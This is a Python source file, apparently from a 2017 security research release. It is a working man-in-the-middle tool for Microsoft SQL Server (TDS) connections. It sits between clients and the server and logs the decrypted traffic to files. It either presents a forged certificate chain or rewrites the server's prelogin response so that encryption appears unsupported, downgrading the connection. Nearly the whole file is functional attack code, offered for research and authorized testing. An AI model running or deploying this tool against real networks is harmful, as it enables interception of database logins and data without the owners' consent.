#!/usr/bin/env python3

# Copyright (C) 2016-2017 Blindspot Security LLC.
# Copyright (C) 2016-2017 Summit Security Group, LLC.
#
# Licensed for your use only in the following situations:
# - Security research
# - Testing of software systems when authorized by the owner
#
# Distribution of derivative works is permitted, provided the above
# restrictions are retained.
#
# For more information on this script, please see:
#  https://summitinfosec.com/2017/12/19/advanced-sql-server-mitm-attacks/
#  http://blog.blindspotsecurity.com/2017/12/advanced-sql-server-mitm-attacks.html
#

import sys
import os
import time
import argparse
import binascii
import traceback
import struct
import socket
import threading

try:
    from bletchley import ssltls
except:
    print('ERROR: Could not locate the bletchley library. Please install bletchley by running:', file=sys.stderr)
    print('         svn co https://code.blindspotsecurity.com/dav/bletchley/', file=sys.stderr)
    print('       And then follow the instructions in bletchley/trunk/INSTALL', file=sys.stderr)
    sys.exit(2)
    
try:
    import OpenSSL
    from OpenSSL import SSL
except:
    print('ERROR: Could not locate pyOpenSSL module.  Under Debian-based systems, try:', file=sys.stderr)
    print('       # apt-get install python3-openssl', file=sys.stderr)
    print('NOTE: pyOpenSSL version 0.14 or later is required!', file=sys.stderr)
    sys.exit(2)

parser = argparse.ArgumentParser(description="")

parser.add_argument('host', default=None,
                    help='IP address or host name of server')
parser.add_argument('log_dir', default=None,
                    help='Directory to write out log of TCP stream data.')
parser.add_argument('--port', type=int, default=1433,
                    help='TCP port of MS SQL Server (default: 1433)')
parser.add_argument('--local_ip', dest='local_ip', type=str, default='0.0.0.0',
                    help='Local IP address to listen on (default: 0.0.0.0)')
parser.add_argument('--local_port', dest='local_port', type=int, default=1433,
                    help='TCP port of to listen on (default: 1433)')
parser.add_argument('--mitm_type', dest='mitm_type', type=str,
                    choices=('cert','downgrade'), default='cert', required=False,
                    help='MitM the SSL/TLS with fake certificate,'
                    ' or try to downgrade the client-side communication?')
options = parser.parse_args()


def logTraffic(id, s):
    fh = open(options.log_dir+'/'+id, "a+b")
    fh.write(s)
    fh.close()

def printTraffic(id, s):
    print(">>%s>> %s" % (id, repr(s)), file=sys.stderr)

def twiddleNone(b, toServer):
    return (False, b)
#XXX
twiddleFunc = twiddleNone


def toHex(s):
    ret_val = ''
    for c in s:
        ret_val += "%.2X " % (struct.unpack("B", c)[0])

    return ret_val


QUIT = 0
# This handles IO in one direction.
# Two of these are spawned for each TLS stream.
def ioHandler(inputSocket, outputSocket, logFunc, stream_id, toServer):
    i = 0
    b = b''
    input_done = 0
    output_done = 0
    write_error = 0
    read_error = 0
    data_read = None
    
    if toServer:
        stream_id = "%s.%s" % (stream_id, "toServer")
    else:
        stream_id = "%s.%s" % (stream_id, "toClient")
    
    print("Opening Stream %s" % stream_id)
    while output_done == 0 and input_done == 0 and QUIT == 0:
        data_read = None
        try:
            data_read = inputSocket.recv(16384)
        except OpenSSL.SSL.Error as se:
            traceback.print_exc()
            read_error = 1
        
        if data_read != None:
            b += data_read

        try:
            if b != b'':
                changes,b_prime = twiddleFunc(b, toServer)
                outputSocket.send(b_prime)
                logFunc(stream_id, b_prime)
                b = b''
        except Exception as e:
            print("Write error:",e)
            write_error = 1

        if read_error or data_read == b'':
            input_done = 1
        if write_error:
            output_done = 1

    if output_done == 1:
        inputSocket.close()
    if input_done == 1:
        outputSocket.close()
    print("Closing Stream %s" % stream_id)
    return




threads = []

def startConversation(serverSock, clientSock, stream_id, handshakeFunc):
    try:
        #serverSock.settimeout(5)
        #clientSock.settimeout(5)
        server,client = handshakeFunc(serverSock, clientSock)
    except Exception as e:
        print("Exception during handshake: ")
        traceback.print_exc()
        return

    
    print("Handshakes done, starting IO threads.", file=sys.stderr)        
    t = threading.Thread(target=ioHandler, args=(client, server, logTraffic, stream_id, 1))
    threads.append(t)
    t.start()
        
    ioHandler(server, client, logTraffic, stream_id, 0)        


def readLine(sock):
    ret_val = ''
    c = ''
    while c != '\n':
        c = sock.recv(1)
        ret_val += c

    return ret_val


# This is needed because TDS upgrades to TLS is a fairly ugly hack in the protocol itself
class TDSSocket():
    _sock = None
    _recv_buf = None
    _tds_recv = None
    _tds_send = None
    _relay_listen = None
    _relay_server = None
    _relay_client = None
    _threads = None
    _running = True
    
    def __init__(self, socket):
        self._sock = socket
        self._recv_buf = b''
        self._tds_recv = 2
        self._tds_send = 2
        self._threads = []
        self._setupRelaySocket()

        
    def _getRelayServer(self):
        connection, client_address = self._relay_listen.accept()
        self._relay_server = connection

        
    def _setupRelaySocket(self):
        path = '/tmp/tds_sock_' + binascii.b2a_hex(os.urandom(12)).decode() # racy, but random
        
        self._relay_listen = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self._relay_listen.bind(path)
        self._relay_listen.listen(1)
        t = threading.Thread(target=self._getRelayServer)
        t.start()
        self._relay_client = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        self._relay_client.connect(path)
        t.join()

        
    def recv(self, bufsize, flags=0):
        if self._tds_recv > 0:
            self._recv_buf += readTDSPacket(self._sock)['body']
            self._tds_recv -= 1
        else:
            self._recv_buf += self._sock.recv(bufsize-len(self._recv_buf), flags)
                
        ret_val = self._recv_buf[:bufsize]
        self._recv_buf = self._recv_buf[bufsize:]
        return ret_val

    
    def send(self, buf, flags=0):
        header = {'type':0x12,
                  'status':0x01,
                  'length':len(buf)+8,
                  'spid':0,
                  'packetid':0,
                  'window':0}
        if self._tds_send > 0:
            writeTDSPacket(self._sock, {'header':header, 'body':buf})
            self._tds_send -= 1
            return len(buf)
        else:
            return self._sock.send(buf, flags)

    
    def ioRelay(self, direction):
        if direction == 'send':
            while self._running:
                buf = self._relay_server.recv(32768)
                #print("Sent by openssl:", len(buf), repr(buf))
                self.send(buf)
        else:
            while self._running:
                buf = self.recv(32768)
                #print("Sending to openssl:", len(buf), repr(buf))
                self._relay_server.send(buf)

    
    def fileno(self):     
        for direction in ('send','recv'):
            t = threading.Thread(target=self.ioRelay, args=((direction,)))
            self._threads.append(t)
            t.start()
        return self._relay_client.fileno()

    
    def close(self):
        self._running = False
        self._relay_client.close()
        self._relay_server.close()
        for t in self._threads:
            t.join()
        self._sock.close()


# https://msdn.microsoft.com/en-us/library/ee320549(v=sql.105).aspx
def readTDSHeader(sock):
    header = sock.recv(8)
    if len(header) != 8:
        raise Exception('Could not read TDS header')

    values = struct.unpack(">BBHHBB" ,header)
    return {'type':values[0],
            'status':values[1],
            'length':values[2],
            'spid':values[3],
            'packetid':values[4],
            'window':values[5]}


def packTDSHeader(header):
    return struct.pack(">BBHHBB",
                       header['type'],
                       header['status'],
                       header['length'],
                       header['spid'],
                       header['packetid'],
                       header['window'])

def readTDSPacket(sock):
    header = readTDSHeader(sock)
    body_len = header['length'] - 8
    body = b''
    while len(body) < body_len:
        body += sock.recv(body_len - len(body))
    
    return {'header':header,'body':body}


def writeTDSPacket(sock, packet):
    h = packTDSHeader(packet['header'])
    sock.sendall(h+packet['body'])

    
# https://msdn.microsoft.com/en-us/library/ee320519(v=sql.105).aspx
def parseTDSPreloginOptions(packet):
    options = []
    b = packet['body']
    for offset in range(0,len(packet['body']),5):
        if b[offset] == 0xff:
            break
        o = struct.unpack(">BHH", b[offset:offset+5])
        options.append({'type':o[0], 'offset':o[1],'length':o[2],
                        'value':b[o[1]:(o[1]+o[2])]})

    packet['options'] = options
    return packet


def handshakeTDS(serverSock, clientSock):
    mitm_type = options.mitm_type
    print("Beginning handshake.", file=sys.stderr)

    prelogin = readTDSPacket(clientSock)
    if mitm_type == 'downgrade':
        prelogin = parseTDSPreloginOptions(prelogin)
        for o in prelogin['options']:
            if o['type'] == 0x01 and o['value'] == 0x03:
                print("Client requires encryption, trying certificate downgrade instead...", file=sys.stderr)
                mitm_type = 'cert'
    writeTDSPacket(serverSock, prelogin)
    
    prelogin_response = readTDSPacket(serverSock)
    if mitm_type == 'downgrade':
        prelogin_response = parseTDSPreloginOptions(prelogin_response)
        for o in prelogin_response['options']:
            if o['type'] == 0x01 and o['value'] != 0x02:
                prelogin_response['body'] = bytearray(prelogin_response['body'])
                #print(repr(prelogin_response['body']))
                prelogin_response['body'][o['offset']] = 0x02  # encryption not supported
                #print(repr(prelogin_response['body']))
    writeTDSPacket(clientSock, prelogin_response)
    
    serverSock = ssltls.startSSLTLS(TDSSocket(serverSock), mode='client')
    print("Server connection established.", file=sys.stderr)

    if mitm_type != 'downgrade':
        key,certs = ssltls.genFakeCertificateChain(ssltls.fetchCertificateChain(serverSock))
        clientSock = ssltls.startSSLTLS(TDSSocket(clientSock), mode='server', key=key, certChain=certs)

    return serverSock,clientSock



listenSock = socket.socket()
listenSock.bind((options.local_ip, options.local_port))
listenSock.listen(100)

try:
    while True:
        try:
            (clientSock, clientAddr) = listenSock.accept()
            print("Connection received from %s:%s." % clientAddr, file=sys.stderr)
            
            serverSock = socket.socket()
            serverSock.connect((options.host,options.port))

            clientSock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            serverSock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        except Exception as e:
            print("Exception while listening: ", e)
            traceback.print_exc()
            continue
        except KeyboardInterrupt as e:
            QUIT=1
            break

        now = int(time.time())
        clientSrcPort = clientAddr[1]
        stream_id = "%d.%d" % (now, clientSrcPort)

        t = threading.Thread(target=startConversation,
                             args=(serverSock, clientSock,
                                   stream_id, handshakeTDS))
        threads.append(t)
        t.start()

except Exception as e:
    print("Unexpected exception: %s" % repr(e), file=sys.stderr)
    
listenSock.close()


QUIT=1
for t in threads:
    t.join()
